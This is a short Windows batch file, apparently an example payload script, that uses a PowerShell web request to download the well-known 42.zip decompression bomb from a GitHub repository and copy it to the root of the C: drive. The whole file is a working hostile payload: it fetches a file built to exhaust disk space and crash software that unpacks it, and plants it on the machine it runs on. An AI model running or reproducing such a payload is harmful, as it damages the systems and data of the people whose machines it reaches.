@echo off
REM An example payload.cmd file

powershell -Command "Invoke-WebRequest https://github.com/iamtraction/ZOD/raw/master/42.zip -OutFile bomb.zip"
echo This is an example payload!
xcopy bomb.zip C:\bomb.zip
timeout 2

exit
